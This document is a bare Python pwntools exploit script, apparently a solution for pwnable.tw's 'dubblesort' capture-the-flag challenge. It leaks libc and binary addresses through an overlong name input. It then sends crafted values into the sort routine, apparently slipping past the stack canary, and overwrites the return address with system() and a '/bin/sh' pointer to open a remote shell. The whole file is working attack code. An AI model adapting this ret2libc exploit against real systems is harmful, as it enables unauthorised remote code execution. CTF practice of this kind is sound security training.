from pwn import *

context.binary = exe = ELF('./dubblesort_patched', checksec= False)

# r = process('./dubblesort_patched')
# gdb.attach(r, api=True, gdbscript='''
#            pdis main
#            ''')

r = remote('chall.pwnable.tw', 10101)

one_gatget_off = 0x3a819
plt_got_off = 0x1b0000
d_by_fun = 1537
d_add_libc = 1769482
sleep_got_off = 0x00001fb8
off_esi = 0x57175
binsh_off = 0x158e8b
pop_esi = 0x00017828
main_offset = 0x000009C3
system_off =  0x0003a940

name = b'a'*19 + b'Chino'
r.sendlineafter(b'name :', name)
print(r.recvuntil(b'Chino'))
out = r.recvuntil(b'\xf7D')
o_by = r.recvuntil(b',')
print(o_by)
binary = u32(o_by[3:7]) - d_by_fun
libc_base = u32(out.split(b'D')[0]) - d_add_libc
print(hex(libc_base))
print(hex(binary))

max_binary = binary + 16384
main = main_offset + binary

num = b'51'
r.sendlineafter(b' sort :', num)

one_gatget = one_gatget_off + libc_base
sleep_got = binary + sleep_got_off
binsh = binsh_off + libc_base
system = libc_base + system_off
print(system+3)
print(binsh)

# r.sendlineafter(b'0 number : ', str(one_gatget).encode('utf-8'))
# r.sendlineafter(b'1 number : ', str(sleep_got).encode('utf-8'))
# r.sendlineafter(b'2 number : ', str(main).encode('utf-8'))
r.sendlineafter(b'number : ', str(system + 3).encode('utf-8'))
r.sendlineafter(b'number : ', str(binsh).encode('utf-8'))

for i in range(0, 7):
    r.sendlineafter(b'number : ', str(binsh).encode('utf-8'))

for i in range(0, 3):
    r.sendlineafter(b'number : ', str(libc_base - 1).encode('utf-8'))



for i in range(0, 12):
    r.sendlineafter(b'number : ', b'1')
    
r.sendlineafter(b'number : ', b'c')


r.interactive()